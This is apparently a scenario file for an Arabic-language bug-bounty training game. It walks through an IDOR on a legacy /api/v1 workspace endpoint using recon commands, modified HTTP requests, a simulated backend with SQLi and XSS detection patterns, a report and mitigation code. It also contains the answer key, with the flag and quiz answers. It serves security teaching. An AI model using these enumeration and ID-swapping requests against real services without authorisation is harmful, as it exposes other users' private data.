// ==========================================================
// SCENARIO 001: IDOR IN API ENDPOINT - FULL USER DATA LEAK
// ==========================================================

window.scenario_001 = {
  "metadata": {
    "id": "scenario-001",
    "title": "IDOR in API Endpoint - Full User Data Leak",
    "level": "Beginner",
    "category": "Authorization",
    "company": "Shopify",
    "reward": "$6,500",
    "time": "30 Min"
  },
  "decisionLog": [
    {
      "hypothesis": "النسخة الثانية من الـ API v2 محمية بالكامل وتتحقق من صلاحيات المستخدمين.",
      "whyFailed": "كود المصادقة في v2 سليم بالفعل ويتحقق من الـ JWT token وعلاقته بمساحة العمل.",
      "planB": "فحص المسارات القديمة مثل v1 للتحقق مما إذا كانت لا تزال نشطة وتقبل طلبات.",
      "ignored": "محاولة فحص هجمات Brute force على لوحة تسجيل الدخول الرئيسية."
    }
  ],
  "payloads": [
    {
      "code": "GET /api/v1/workspaces/43/members HTTP/1.1\nAuthorization: Bearer [attacker_jwt]",
      "explanation": "استدعاء endpoint قديم v1 مع تمرير معرف مساحة عمل أخرى (43).",
      "whyWorked": "الـ API القديم لا يطابق معرف المستخدم مع معرف مساحة العمل المطلوبة، مما يسمح بتسريب البيانات.",
      "alternatives": [
        "GET /api/v1/workspaces/43/documents",
        "GET /api/v1/workspaces/43/documents/5001/download"
      ]
    }
  ],
  "mistakes": [
    {
      "mistake": "التركيز الكامل على فحص مسارات v2 فقط.",
      "whyWrong": "المطورون غالبًا ما يحمون الإصدارات الأحدث وينسون إغلاق أو حماية الإصدارات القديمة.",
      "betterWay": "تجميع روابط الـ API التاريخية عبر Waybackurls وفحص إصدارات v1 و v2."
    }
  ],
  "steps": [
    {
      "name": "How a Real Bug Hunter Thinks",
      "time": "09:00",
      "workspace": "markdown",
      "xpReward": 100,
      "description": "### 🎯 Scenario context: what the company left behind\n\nشركة: Shopify\nميزة: إدارة مساحات العمل (Workspaces)\nالإصدار القديم: `/api/v1`\nالإصدار الجديد: `/api/v2`\n\n#### لماذا نهتم بالإصدارات القديمة؟\n- غالباً ما يتم إطلاق إصدار جديد بينما يظل القديم نشطاً.\n- الإصدار القديم قد لا يحتوي على نفس الضوابط الأمنية.\n- باحث الـ Bug Bounty الذكي يسأل دائماً: هل هناك نسخة مهملة يمكن استغلالها؟\n\n> **Expert Thinking**\n> - إذا عملت `v2` وأنتظرنا هناك، سنفقد فرصة استهداف `v1`.\n> - النسخة القديمة هي مكان جيد للبحث عن أخطاء التحكم في الوصول.\n\n#### لماذا IDOR؟\n- لأن API القديم يحتوي على معرّف مورد يمكن تغييره (مثل `workspace_id`).\n- IDOR يحدث عندما لا يتحقق الخادم من أن المستخدم يمكنه الوصول لذلك المورد.\n\n#### كيف نفكر؟\n1. ابحث عن المسار القديم النشط.\n2. استكشف المتغيرات التي يمكن تعديلها يدوياً.\n3. فكر: هل هذا المتغير يرتبط بصلاحيات المستخدم؟\n\n#### سؤال مهم قبل الانتقال\nماذا تتوقع أن يحدث إذا غيّرنا `workspace_id=42` إلى `43`؟\n\nاضغط على **Next Step** للانتقال إلى مرحلة Recon.",
      "aiAdvisor": {
        "hint": "اقرأ قواعد الفحص بعناية ثم انطلق للخطوة التالية.",
        "payloadExplanation": "لا يوجد استغلال مطلوب في هذه الخطوة الأولى.",
        "failureExplanation": "لا يمكن الفشل في هذه الخطوة التمهيدية."
      }
    },
    {
      "name": "Recon and Information Gathering",
      "time": "09:15",
      "workspace": "recon",
      "xpReward": 150,
      "description": "### 🔍 ما هو Recon؟\nRecon هو مرحلة جمع المعلومات قبل أن تبدأ الهجوم.\n\n#### هدفنا هنا هو:\n- معرفة أي API تعمل.\n- العثور على المسارات القديمة.\n- تحديد المتغيرات التي يمكن تعديلها.\n\nاليوم هدفنا ليس الاختراق، بل فهم ما يوجد بالفعل.\n\n#### كيف يقرأ الباحث مسار API؟\n- `GET` يعني قراءة بيانات.\n- `/api/v1/` يعني إصدار API قديم.\n- `workspaces` يعني أن لدينا مساحات عمل.\n- `42` هو معرف مورد يمكن تغييره.\n\n#### Expert Thinking\n- العثور على `/api/v1/` هو علامة قوية على أن هناك نسخة قديمة.\n- المعرفات التسلسلية (`42`, `43`) هي أهداف محتملة لاختبار IDOR.\n\nفي هذه الخطوة، نستخدم أدوات جمع المعلومات لإيجاد مسارات قديمة ومرشحة لاستهداف IDOR.\nاختر الأداة المناسبة لتشغيلها من الأسفل.",
      "terminalCommands": [
        {
          "name": "subfinder -d target-app.com -silent",
          "correct": false,
          "output": [
            {
              "text": "[INF] Enumerating subdomains for target-app.com",
              "type": "info"
            },
            {
              "text": "www.target-app.com",
              "type": "out"
            },
            {
              "text": "api.target-app.com",
              "type": "out"
            },
            {
              "text": "legacy.target-app.com",
              "type": "out"
            },
            {
              "text": "[INF] Subdomain enumeration completed.",
              "type": "success"
            }
          ]
        },
        {
          "name": "waybackurls target-app.com",
          "correct": true,
          "evidence": {
            "title": "Historical API v1 Endpoint",
            "content": "GET /api/v1/workspaces/{workspace_id}/members\nGET /api/v1/workspaces/{workspace_id}/documents\nGET /api/v1/workspaces/{workspace_id}/documents/5001/download"
          },
          "output": [
            {
              "text": "https://api.target-app.com/api/v2/auth/login",
              "type": "out"
            },
            {
              "text": "https://api.target-app.com/api/v2/workspaces/active",
              "type": "out"
            },
            {
              "text": "https://api.target-app.com/api/profile",
              "type": "out"
            },
            {
              "text": "https://api.target-app.com/api/settings",
              "type": "out"
            },
            {
              "text": "https://api.target-app.com/api/v1/workspaces/42/members",
              "type": "success"
            },
            {
              "text": "https://api.target-app.com/api/v1/workspaces/42/documents",
              "type": "success"
            },
            {
              "text": "https://api.target-app.com/api/v1/workspaces/43/members",
              "type": "success"
            },
            {
              "text": "https://api.target-app.com/api/v1/workspaces/43/documents/5001/download",
              "type": "success"
            },
            {
              "text": "[!] Notice: Detected active legacy API v1 endpoints and noisy routes in history!",
              "type": "success"
            }
          ]
        }
      ],
      "aiAdvisor": {
        "hint": "شغّل أمر waybackurls للبحث عن مسارات قديمة تم أرشفتها مسبقاً.",
        "payloadExplanation": "يقوم waybackurls بجلب جميع الروابط التاريخية المؤرشفة للموقع من خوادم الأرشيف.",
        "failureExplanation": "عدم فحص الروابط التاريخية سيحرمك من اكتشاف مسارات API القديمة المتروكة."
      }
    },
    {
      "name": "IDOR Hypothesis",
      "time": "09:40",
      "workspace": "markdown",
      "xpReward": 150,
      "description": "### 🧠 Thinking like a bug hunter\n\nلدينا الآن مسار قديم يعمل: `GET /api/v1/workspaces/42/members`\n\n#### لماذا هذا المسار مهم؟\n- يحتوي على `workspace_id`، وهو معرف يمكن تغييره بسهولة.\n- إذا لم يتحقق الخادم من صلاحية المستخدم، فإن تغيير هذا المعرف سيكشف بيانات مساحة عمل أخرى.\n\n#### كيف نختبر الفرضية؟\n1. نرى الاستجابة العادية لمساحة العمل الخاصة بنا.\n2. نغير المعرف إلى رقم آخر.\n3. نبحث عن بيانات غير مصرح بها.\n\n#### Expert Thinking\n- تغيير `workspace_id` هو من أبسط الاختبارات التي يقوم بها الباحث.\n- ليس ضروريًا أن نحاول هجمات معقدة في البداية.\n- إذا نجح التغيير، يكون هذا دليلًا قويًا على IDOR.\n\n#### السؤال الذي يجب أن تخطط له\nما الذي تتوقعه عندما تغير `workspace_id=42` إلى `43`؟\n\nاختر الخيار الصحيح لبدء اختبار الفرضية.",
      "choices": [
        {
          "text": "أ) محاولة إرسال هجمات SQL Injection في معامل البحث الرئيسي.",
          "correct": false,
          "xp": -10,
          "timePenalty": 5,
          "outcome": "طلب البحث لا علاقة له بثغرة المعرفات المباشرة IDOR."
        },
        {
          "text": "ب) إرسال طلب للحصول على أعضاء مساحتنا (42) ثم تعديل المعرف إلى رقم آخر تسلسلي (43) لمعرفة ما إذا كان الخادم يرجع البيانات.",
          "correct": true,
          "xp": 50,
          "outcome": "تخمين رائع! بما أن المعرفات تسلسلية (Sequential IDs)، فإن تغيير الرقم هو الطريقة الكلاسيكية لفحص ثغرات IDOR."
        },
        {
          "text": "ج) محاولة تعديل الـ JWT Header لحذف خوارزمية التوقيع.",
          "correct": false,
          "xp": -5,
          "timePenalty": 2,
          "outcome": "هذا اختبار لثغرات JWT وليس IDOR مباشرة."
        }
      ],
      "aiAdvisor": {
        "hint": "اختر الخيار (ب) لتجربة تعديل المعرف التسلسلي مباشرة.",
        "payloadExplanation": "فحص المعرفات التسلسلية هو جوهر فحص ثغرات الـ IDOR.",
        "failureExplanation": "اختيار مسارات معقدة قبل فحص المتغيرات البسيطة يضيع الوقت."
      }
    },
    {
      "name": "Burp Verification",
      "time": "10:05",
      "workspace": "burp",
      "xpReward": 200,
      "description": "### 🌐 لماذا نستخدم Burp؟\nالمتصفح وحده لا يسمح لنا بتعديل الطلب بسهولة بعد إرساله.\nBurp هو الوسيط الذي يقف بينك وبين الخادم، ويتيح لك تعديل الطلب قبل وصوله.\n\n#### كيف يعمل التدفق؟\n- المتصفح → Burp Proxy → الخادم\n- Burp يلتقط الطلب ويمنحك فرصة لتعديله.\n\n#### ما الذي نغيره؟\n- `workspace_id` فقط: من `42` إلى `43`.\n- لا نغير التوكن أو نوع الطلب.\n\n#### Expert Thinking\n- هذا هو الاختبار الكلاسيكي لثغرة IDOR.\n- نجاح التغيير يعني أن الخادم لا يربط المعرف بالهوية الصحيحة للمستخدم.\n- في الواقع، هذا هو النوع من الأخطاء التي يكشف عنها الباحثون بسرعة.\n\nاستخدم زر **Verify IDOR** لمعاينة رد الخادم بعد تعديل `workspace_id`.",
      "burpRequest": "GET /api/v1/workspaces/42/members HTTP/1.1\nHost: api.target-app.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...\nAccept: application/json",
      "burpResponse": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"workspace_id\": 42,\n  \"members\": [\n    {\"user_id\": 1337, \"email\": \"attacker@example.com\", \"role\": \"member\"}\n  ]\n}",
      "burpActions": [
        {
          "name": "Verify IDOR",
          "correct": true,
          "modifiedRequest": "GET /api/v1/workspaces/43/members HTTP/1.1\nHost: api.target-app.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...\nAccept: application/json",
          "modifiedResponse": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"workspace_id\": 43,\n  \"members\": [\n    {\"user_id\": 999, \"email\": \"ceo@target-company.com\", \"role\": \"admin\"},\n    {\"user_id\": 998, \"email\": \"finance@target-company.com\", \"role\": \"member\"}\n  ],\n  \"documents\": [\n    {\"doc_id\": 5001, \"title\": \"Q4 Financial Report\", \"created_by\": 999}\n  ]\n}",
          "evidence": {
            "title": "IDOR Leak Workspace 43",
            "content": "GET /api/v1/workspaces/43/members -> Leaks Workspace Members & Documents"
          }
        }
      ],
      "aiAdvisor": {
        "hint": "اضغط على زر Verify IDOR لتعديل معرف مساحة العمل إلى 43.",
        "payloadExplanation": "الطلب المعدل يطلب بيانات مساحة عمل لا تنتمي للمهاجم.",
        "failureExplanation": "إذا لم تقم بتعديل المعرف، فلن تتمكن من تأكيد الثغرة."
      }
    },
    {
      "name": "Exploitation & Flag",
      "time": "10:30",
      "workspace": "lab",
      "xpReward": 300,
      "instructions": "قم باستغلال مسار تحميل الملفات لقراءة مستند التقرير المالي الحساس (doc_id = 5001) للحصول على العلم (Flag).",
      "targetUrl": "https://api.target-app.com/api/v1/workspaces/43/documents/5001/download",
      "correctFlag": "FLAG{api_v1_idor_workspace_takeover}",
      "aiAdvisor": {
        "hint": "استخدم الرابط الموضح للحصول على ملف التقرير وقراءة العلم بداخله: FLAG{api_v1_idor_workspace_takeover}",
        "payloadExplanation": "العلم يمثل إثبات الاختراق الكامل للوصول لملفات سرية.",
        "failureExplanation": "تأكد من كتابة العلم بدقة."
      }
    },
    {
      "name": "Report Writing",
      "time": "11:00",
      "workspace": "report",
      "xpReward": 250,
      "aiAdvisor": {
        "hint": "اكتب الكلمات المفتاحية بالإنجليزية مثل 'idor' و 'v1' في التقرير.",
        "payloadExplanation": "صياغة التقرير مع إثبات التأثير الكامل (Critical impact).",
        "failureExplanation": "عدم كتابة الكلمات المفتاحية يؤدي لرفض التقرير أو تقليل المكافأة."
      }
    },
    {
      "name": "Triage & Verdict",
      "time": "5 Days Later",
      "workspace": "review",
      "aiAdvisor": {
        "hint": "راجع قرار الفحص والمكافأة الممنوحة.",
        "payloadExplanation": "قرار المشرف الأمني لإصلاح وحل الثغرة.",
        "failureExplanation": "لا يوجد فشل هنا."
      }
    },
    {
      "name": "Lessons Learned",
      "time": "Post-Incident",
      "workspace": "quiz",
      "quizData": [
        {
          "question": "ما هو السبب الرئيسي لحدوث ثغرات IDOR؟",
          "options": [
            "عدم استخدام تشفير قوي لكلمات المرور.",
            "اعتماد الخادم على المدخلات القادمة من المستخدم للوصول للموارد دون التحقق من صلاحياته لها.",
            "استخدام جدار حماية ضعيف.",
            "تسريب ملفات التكوين."
          ],
          "answer": 1
        },
        {
          "question": "كيف يمكن للمطور حماية التطبيق من ثغرات IDOR بالكامل؟",
          "options": [
            "تشفير المعرفات فقط في الواجهة الأمامية.",
            "إلغاء تفعيل بروتوكول HTTP.",
            "تطبيق نظام تحكم بالصلاحيات (Access Control) صارم في كل طلب على مستوى الخادم.",
            "حظر استخدام Burp Suite."
          ],
          "answer": 2
        }
      ],
      "aiAdvisor": {
        "hint": "الإجابة الأولى هي الخيار الثاني، والإجابة الثانية هي الخيار الثالث.",
        "payloadExplanation": "التحقق من فهمك لآلية الحماية والإصلاح للثغرة.",
        "failureExplanation": "الإجابات الخاطئة تؤدي لخصم نقاط من الـ XP."
      }
    }
  ],
  "realReport": {
    "title": "IDOR in API v1 workspaces endpoint allows accessing private workspaces documents",
    "severity": "Critical",
    "type": "IDOR",
    "desc": "The legacy API v1 endpoint at /api/v1/workspaces/{id}/members and /documents does not perform relationship checks between the authenticated user and the requested workspace. Any user can access data of other workspaces.",
    "steps": "1. Login and get valid authorization token.\n2. Send request to /api/v1/workspaces/43/members and notice it returns workspace data.\n3. Access /api/v1/workspaces/43/documents/5001/download to download sensitive files.",
    "impact": "Unrestricted access to all customer workspaces and private financial files.",
    "feedback": "Outstanding report! The impact is critical due to direct leakage of private PDF invoices and financial sheets. Bounty awarded.",
    "keywords": [
      "idor",
      "v1"
    ]
  },
  "writeup": {
    "description": "ثغرة **IDOR (Insecure Direct Object Reference)** تحدث عندما يُرجع الـ API البيانات اعتماداً على معرّف مقدَّم من المستخدم دون التحقق من صلاحية الوصول. هنا المشكلة في الـ API القديم `/api/v1` الذي يعاني من:\n- **عدم التحقق من Authorization**: يتحقق فقط من صحة الـ JWT ولكن لا يتحقق من علاقة المستخدم بمساحة العمل المطلوبة.\n- **Legacy endpoints**: المطورون أضافوا حماية على `/api/v2` ونسوا أن `/api/v1` لا يزال يعمل.",
    "payloadAnalysis": "الـ payload هو طلب GET بسيط مع تعديل رقم المعرّف:\n```http\nGET /api/v1/workspaces/43/members HTTP/1.1\nHost: api.target-app.com\nAuthorization: Bearer [attacker_jwt]\n```\nتغيير `42` (مساحة عمل المهاجم) → `43` (مساحة عمل الضحية) يكشف البيانات الحساسة كاملة. المعرفات التسلسلية تجعل هذا الاستغلال بسيطاً جداً.",
    "impact": "**Critical ($6,500)** — وصول كامل لبيانات أعضاء مساحات العمل الأخرى، التقارير المالية السرية، أسماء المستخدمين وبريدهم الإلكتروني. في الحالات الإنتاجية: خرق كامل لـ GDPR وسيناريوهات الابتزاز.",
    "mitigation": "```javascript\n// Express.js middleware: Authorization check\nasync function authorizeWorkspaceAccess(req, res, next) {\n  const { workspace_id } = req.params;\n  const userId = req.user.id; // From JWT\n  \n  // Check if user belongs to this workspace\n  const membership = await db.WorkspaceMember.findOne({\n    where: {\n      workspace_id: workspace_id,\n      user_id: userId\n    }\n  });\n  \n  if (!membership) {\n    return res.status(403).json({\n      error: 'Access denied: You are not a member of this workspace'\n    });\n  }\n  \n  next();\n}\n\n// Apply middleware to ALL workspace routes (v1 AND v2)\napp.use('/api/v1/workspaces/:workspace_id', authorizeWorkspaceAccess);\napp.use('/api/v2/workspaces/:workspace_id', authorizeWorkspaceAccess);\n```"
  },
  simulateBackend(requestText, bodyJson) {
    const parsed = window.HttpRequestParser.parse(requestText);
    const builder = new window.HttpResponseBuilder();

    // 1. Detect SQL Injection attempts
    if (/union\s+select|' \s*or\s+|sleep\s*\(/i.test(requestText)) {
      return builder
        .setStatus(200)
        .setBody({ status: "success", members: [] })
        .setObservabilityLog("[WARN] Database Guard: SQL syntax keywords detected in query.\n[INFO] Database Driver: Escaped parameter successfully. Prepared Statements active.\n[INFO] SQLi validation complete: 0 rows returned.")
        .setOutcome("لقد حاولت حقن استعلام SQL. قاعدة البيانات تستخدم الاستعلامات المجهزة (Prepared Statements) بأمان، مما يمنع تمرير الأوامر إلى محرك SQL.")
        .build();
    }

    // 2. Detect XSS attempts
    if (/<script|javascript:|onload=/i.test(requestText)) {
      return builder
        .setStatus(200)
        .setBody({ status: "error", message: "Invalid characters detected: &lt;script&gt;" })
        .setObservabilityLog("[WARN] Security Filter: HTML tag syntax detected in request.\n[INFO] Sanitization: Encoded HTML tags to prevent cross-site scripting (XSS).")
        .setOutcome("لقد حاولت تنفيذ هجوم XSS. يقوم السيرفر بترميز النصوص والمحارف الخاصة (HTML Entity Encoding) قبل معالجتها، مما يبطل مفعول الكود.")
        .build();
    }

    // Handle noisy API routes before evaluating legacy v1 endpoints
    if (/^\/api\/(profile|settings|messages)/i.test(parsed.path) || /^\/api\/v2\//i.test(parsed.path)) {
      return builder
        .setStatus(404, "Not Found")
        .setBody({ error: "Resource not available or accessible." })
        .setObservabilityLog(`[INFO] API Router: Received request for noisy or modern endpoint "${parsed.path}".\n[INFO] Legacy router ignores this traffic.`)
        .setOutcome("هذا المسار غير مفيد للاختبار الحالي. ركز على المسارات القديمة في /api/v1/workspaces/...")
        .build();
    }

    // Check GET request paths
    const match = parsed.path.match(/^\/api\/v1\/workspaces\/(\d+)\/(members|documents(?:\/5001\/download)?)$/i);

    if (!match) {
      return builder
        .setStatus(404, "Not Found")
        .setBody({ error: "Endpoint not found or method not allowed on this path." })
        .setObservabilityLog(`[WARN] API Router: Route matching failed for request path "${parsed.path}".\n[INFO] Allowed paths: GET /api/v1/workspaces/{workspace_id}/members, /documents, or /documents/5001/download`)
        .setOutcome("المسار غير صحيح أو غير مدعوم في هذا السيناريو. استخدم مسار /api/v1/workspaces/{workspace_id}/members أو /documents أولاً.")
        .build();
    }

    const workspaceId = parseInt(match[1], 10);
    const subRoute = match[2];

    if (workspaceId === 42) {
      const body = { workspace_id: 42 };
      if (subRoute === 'members') {
        body.members = [
          { user_id: 1337, email: "attacker@example.com", role: "member" }
        ];
      } else {
        body.documents = [
          { doc_id: 5001, title: "Q4 Financial Report", created_by: 1337 }
        ];
      }
      return builder
        .setStatus(200)
        .setBody(body)
        .setObservabilityLog(`[INFO] API Router: Routing legacy v1 request.\n[INFO] Auth Handler: Bearer token validated for User_ID: 1337.\n[INFO] Authz Check: User is member of workspace 42. Access granted.\n[INFO] Data Controller: Returning workspace details for workspace 42.`)
        .setOutcome("تم طلب بيانات مساحة عملك الحالية (42). لتأكيد وجود ثغرة IDOR، حاول تغيير المعرف إلى مساحة عمل أخرى (مثلاً 43).")
        .build();
    } else if (workspaceId === 41) {
      return builder
        .setStatus(403, "Forbidden")
        .setBody({ error: "Access denied to workspace 41." })
        .setObservabilityLog(`[WARN] API Router: Access denied for workspace 41.\n[INFO] Auth Handler: Bearer token validated, but no membership found.`)
        .setOutcome("مساحة العمل 41 تمنع الوصول، مما يشير إلى أن ليس كل تغيير معرف يؤدي إلى ثغرة.")
        .build();
    } else if (workspaceId === 44) {
      return builder
        .setStatus(404, "Not Found")
        .setBody({ error: "Workspace 44 not found." })
        .setObservabilityLog(`[INFO] API Router: Workspace 44 not found.\n[INFO] Legacy router returned 404.`)
        .setOutcome("المساحة 44 غير موجودة. حاول مسارات أو أرقام معرفات أكثر صلة.")
        .build();
    } else if (workspaceId === 43) {
      if (subRoute === "members") {
        return builder
          .setStatus(200)
          .setBody({
            workspace_id: 43,
            members: [
              { user_id: 999, email: "ceo@target-company.com", role: "admin" },
              { user_id: 998, email: "finance@target-company.com", role: "member" }
            ],
            documents: [
              { doc_id: 5001, title: "Q4 Financial Report", created_by: 999 }
            ]
          })
          .setCorrect(true)
          .setObservabilityLog(`[INFO] API Router: Routing legacy v1 request.\n[INFO] Auth Handler: Bearer token validated for User_ID: 1337.\n[WARN] Authz Check: Missing authorization check between User: 1337 and Workspace: 43.\n[CRITICAL] Data Leakage: User: 1337 successfully accessed private data of Workspace: 43 (IDOR)!`)
          .setOutcome("تجاوزت صلاحيات الوصول بنجاح! السيرفر لم يتحقق من ملكيتك لمساحة العمل 43 وقام بإرجاع بيانات الأعضاء والملفات السرية.")
          .setEvidence("IDOR Leak Workspace 43", `GET /api/v1/workspaces/43/members -> Leaks Workspace Members & Documents`)
          .build();
      } else if (subRoute === 'documents') {
        return builder
          .setStatus(200)
          .setBody({
            workspace_id: 43,
            documents: [
              { doc_id: 5001, title: "Q4 Financial Report", created_by: 999 },
              { doc_id: 5002, title: "Employee Payroll", created_by: 999 }
            ]
          })
          .setCorrect(true)
          .setObservabilityLog(`[INFO] API Router: Routing legacy v1 request.\n[INFO] Auth Handler: Bearer token validated for User_ID: 1337.\n[WARN] Authz Check: Missing authorization check between User: 1337 and Workspace: 43.\n[CRITICAL] Data Leakage: User: 1337 successfully accessed document metadata for Workspace: 43 (IDOR)!`)
          .setOutcome("تم الوصول إلى قائمة المستندات لworkspace 43 بدون صلاحية مناسبة. هذا يؤكد وجود تسريب IDOR في API القديم.")
          .setEvidence("IDOR Leak Workspace 43 Documents", `GET /api/v1/workspaces/43/documents -> Leaks Document Metadata`)
          .build();
      } else {
        return builder
          .setStatus(200)
          .setBody({
            status: "success",
            message: "Downloading file Q4 Financial Report (PDF)...",
            download_url: "/api/v1/workspaces/43/documents/5001/download?token=..."
          })
          .setCorrect(true)
          .setObservabilityLog(`[INFO] API Router: Routing download request.\n[INFO] Auth Handler: Bearer token validated.\n[WARN] Authz Check: Missing access control on document download.\n[CRITICAL] Data Leakage: Downloaded sensitive Q4 Financial Report (doc_id: 5001).`)
          .setOutcome("تم الوصول إلى رابط التحميل بنجاح! هذا يؤكد إمكانية تسريب المستندات الحساسة بالكامل.")
          .build();
      }
    } else {
      return builder
        .setStatus(404, "Not Found")
        .setBody({
          error: `Workspace ${workspaceId} not found or access denied.`
        })
        .setObservabilityLog(`[INFO] API Router: Routing request to workspace ${workspaceId}.\n[WARN] Authz Check: Access denied. Workspace either does not exist or user has no relations.`)
        .setOutcome(`مساحة العمل ${workspaceId} غير صالحة أو لا تحتوي على بيانات مفيدة للاستغلال. حاول استهداف معرفات أكثر احتمالاً، مثل 43.`)
        .build();
    }
  }
};
